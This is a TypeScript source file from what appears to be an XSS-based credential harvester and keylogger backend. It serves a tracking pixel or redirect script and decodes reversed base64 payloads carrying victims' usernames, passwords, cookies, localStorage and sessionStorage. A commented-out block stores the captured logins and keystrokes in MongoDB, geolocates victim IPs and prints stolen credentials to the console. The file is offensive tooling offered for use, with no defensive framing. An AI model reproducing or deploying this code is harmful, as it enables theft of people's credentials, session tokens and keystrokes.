const reverse = require('reverse-string')

import { Record } from './definitions/record'
import Project from '../database/Project'
import chalk from 'chalk'
import Keylogger from './Keylogger'
import Password from './Password'

export default class {
  db: any

  constructor(mongodb: any) {
    this.db = mongodb
  }

  request(req: any, res: any) {
    let { headers, path } = req
    let base64

    if (path.slice(-1) !== '$') {
      base64 = path.substring(1).split(/\/(.+)?/, 2)[1]
      let onePixelGif = [
        0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x21, 0xf9, 0x04, 0x04, 0x00, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3b
      ]
      res
        .set('Content-Type', 'image/gif')
        .set('Content-Length', onePixelGif.length)
        .status(200)
        .send(Buffer.from(onePixelGif))
    } else {
      /**
       * Bypass CORS enabled
       */
      base64 = path.substring(1).split(/\/(.+)?/, 2)[1].slice(0, -1)
      res.set('Content-Type', 'text/html').send('<script>window.history.back()</script>')
    }
    this.parse(base64).then((data: any) => {
      // if (data.)
      console.log(data)
      // Record(record).then(message => {
      //   if (config.debug) {
      //     console.log(
      //       chalk.greenBright('[record] ') +
      //       chalk.yellowBright(message)
      //     )
      //   }
      // }).catch(error => {
      //   if (config.debug) {
      //     console.log(
      //       chalk.redBright('[record] ') +
      //       chalk.yellowBright(error)
      //     )
      //   }
      // })
    }).catch(error => {
      if (config.debug) console.log(chalk.redBright('[record] ') + chalk.yellowBright(error))
    })
  }

  parse(base64: string) {
    return new Promise<{type: 'password' | 'keylogger', data: Record.password | Record.keylogger}>((resolve, reject) => {
      if (typeof base64 === 'string') {
        try {
          let json = JSON.parse(decodeURI(Buffer.from(reverse(base64), 'base64').toString()))
          if (json) {
            if (json.t === 0) {
              let record: Record.passwordData = json
              if (!(typeof record.a === 'string')) return reject(`type mismatch on object literal "a", should equal type "string" but it's of type "${typeof record.a}" with the value of "${record.a}" `)
              if (!(typeof record.b === 'string' || typeof record.b === 'undefined')) return reject(`type mismatch on object literal "b", should equal type "string" but it's of type "${typeof record.b}" with the value of "${record.b}" `)
              if (!(typeof record.c === 'string' || typeof record.c === 'undefined')) return reject(`type mismatch on object literal "c", should equal type "string" but it's of type "${typeof record.c}" with the value of "${record.c}" `)
              if (!(typeof record.d === 'string' || typeof record.d === 'undefined')) return reject(`type mismatch on object literal "d", should equal type "string" but it's of type "${typeof record.d}" with the value of "${record.d}" `)
              if (!(typeof record.e === 'number' || typeof record.e === 'undefined')) return reject(`type mismatch on object literal "e", should equal type "number" but it's of type "${typeof record.e}" with the value of "${record.e}" `)
              if (!(typeof record.f === 'number' || typeof record.f === 'undefined')) return reject(`type mismatch on object literal "f", should equal type "number" but it's of type "${typeof record.f}" with the value of "${record.f}" `)
              if (!(typeof record.g === 'object' || typeof record.g === 'undefined')) return reject(`type mismatch on object literal "g", should equal type "object" but it's of type "${typeof record.g}" with the value of "${record.g}" `)
              if (!(typeof record.h === 'object' || typeof record.h === 'undefined')) return reject(`type mismatch on object literal "h", should equal type "object" but it's of type "${typeof record.h}" with the value of "${record.h}" `)
              if (!(typeof record.i === 'string' || typeof record.i === 'undefined')) return reject(`type mismatch on object literal "i", should equal type "string" but it's of type "${typeof record.i}" with the value of "${record.i}" `)
              if (!(typeof record.j === 'string' || typeof record.j === 'undefined')) return reject(`type mismatch on object literal "j", should equal type "string" but it's of type "${typeof record.j}" with the value of "${record.j}" `)
              resolve({
                type: 'password',
                data: {
                  project: record.a,
                  username: record.b,
                  password: record.c,
                  url: record.d,
                  width: record.e,
                  height: record.f,
                  localStorage: record.g,
                  sessionStorage: record.h,
                  cookies: record.i,
                  title: record.j,
                }
              })
            } else if (json.t === 1) {
              let record: Record.keyloggerData = json
            } else {
              reject(`missing record type`)
            }
          } else {
            reject(`empty json object`)
          }
        } catch (e) {
          reject(`invalid base64 encoded json string (${e})`)
        }
      } else {
        reject('empty request path')
      }
    })
  }
}

/**
 *     let Record = record => {
      return new Promise((resolve, reject) => {
        let project = 'a'
        let type = 't'
        let username = 'b'
        let identifier = 'b'
        let password = 'c'
        let keys = 'c'
        let url = 'd'
        let width = 'e'
        let height = 'f'
        let localStorage = 'g'
        let sessionStorage = 'h'
        let cookies = 'i'
        let title = 'j'
        if (record[project]) {
          Project(record[project]).then(doc => {
            if (req.header('Referer') && doc.config.filter.domains.length > 0) {
              let referer = new URL(req.header('Referer'))
              let allowed = true
              if (doc.config.filter.type.toLowerCase() === 'whitelist') allowed = false
              doc.config.filter.domains.forEach(domain => {
                if (domain.enabled === false) return
                try {
                  domain = new URL(domain.match)
                } catch (e) {
                  return
                }
                if (doc.config.filter.type.toLowerCase() === 'whitelist') {
                  // Whitelist
                  if (domain.host === referer.host) allowed = true
                } else {
                  // Blacklist
                  if (domain.host === referer.host) allowed = false
                }
              })
              if (!allowed) {
                if (doc.config.filter.type.toLowerCase() === 'whitelist') {
                  reject("domain hasn't been whitelisted, not recording")
                } else {
                  reject('domain has been blacklisted, not recording')
                }
                return
              }
            }
            var ip
            try {
              ip = headers['x-forwarded-for'].split(',')[0]
            } catch (e) {
              ip = getIP(req.connection.remoteAddress)
            }
            request({
              url: 'http://ip-api.com/json/' + ip,
              method: 'GET',
              headers: {
                'Accept': 'application/json'
              }
            }, (error, response, parsedIP) => {
              if (error) throw error
              try {
                ip = JSON.parse(parsedIP)
              } catch (e) {

              }
              if (record[type] === 0) {
                // Password logger
                var c = {}
                try {
                  if (record[cookies]) {
                    var pairs = record[cookies].split(';')
                    for (var i = 0; i < pairs.length; i++) {
                      var pair = pairs[i].split('=')
                      c[pair[0]] = unescape(pair[1])
                    }
                  } else {
                    c = record[cookies]
                  }
                } catch (e) {
                  // throw(e)
                  c = record[cookies]
                }
                projects.updateOne({
                  name: record[project]
                }, {
                  $push: {
                    passwords: {
                      timestamp: new Date(),
                      username: record[username],
                      password: record[password],
                      url: {
                        title: record[title],
                        href: record[url]
                      },
                      ip: ip,
                      browser: {
                        width: record[width],
                        height: record[height],
                        'user-agent': parseAgent(headers['user-agent']),
                        headers: me(headers)
                      },
                      storage: {
                        local: me(record[localStorage]),
                        session: me(record[sessionStorage]),
                        cookies: me(c)
                      }
                    }
                  }
                }).then(() => {
                  if (config.debug) {
                    console.log(
                      chalk.greenBright('[Record] ') +
                      chalk.yellowBright('recorded login ') +
                      chalk.magentaBright(record[username]) +
                      chalk.yellowBright(':') +
                      chalk.magentaBright(record[password]) +
                      chalk.yellowBright(' for project ') +
                      chalk.cyanBright(record[project])
                    )
                  }
                  resolve('wrote record to database')
                })
              } else if (record[type] === 1) {
                // Keylogger
                let timestamp = new Date()
                try {
                  timestamp = new Date(record[identifier])
                } catch (e) {}
                // If the length is greater than 10,
                if (record[keys]) {
                  let keystrokes = []
                  try {
                    for (i = 0; i < record[keys].length; i++) {
                      let key = record[keys][i]
                      let keytype = 'keydown'
                      if (key.endsWith('_') && key.length !== 1) {
                        key = key.slice(0, -1)
                        keytype = 'keyup'
                      }
                      let keyname = key

                      if (keyname && keytype) {
                        keystrokes.push('[' + keytype + ' ' + keyname + ']')
                      } else {
                        reject('invalid keylogger keycode')
                        break
                      }
                    }
                  } catch (e) {
                    reject('failed to parse keylogger array')
                    throw e
                  }
                  projects.updateOne({
                    'name': record[project],
                    'keylogger.timestamp': timestamp
                  }, {
                    $pushAll: {
                      'keylogger.$.keys': keystrokes
                    }
                  }).then((e) => {
                    if (e.result.nModified === 0) {
                      // Add new keylogger record
                      projects.updateOne({
                        name: record[project]
                      }, {
                        $push: {
                          keylogger: {
                            timestamp: timestamp,
                            ip: ip,
                            url: {
                              title: record[title],
                              href: record[url]
                            },
                            browser: {
                              headers: me(headers),
                              'user-agent': parseAgent(headers['user-agent'])
                            },
                            keys: keystrokes
                          }
                        }
                      }).then(() => {
                        resolve('wrote record to database')
                      })
                    } else {
                      resolve('wrote log to database')
                    }
                  })
                } else {
                  reject('keylogger value(s) not specified')
                }
              } else {
                reject('invalid / missing record type')
              }
            })
          })
        }
      })
    }
 */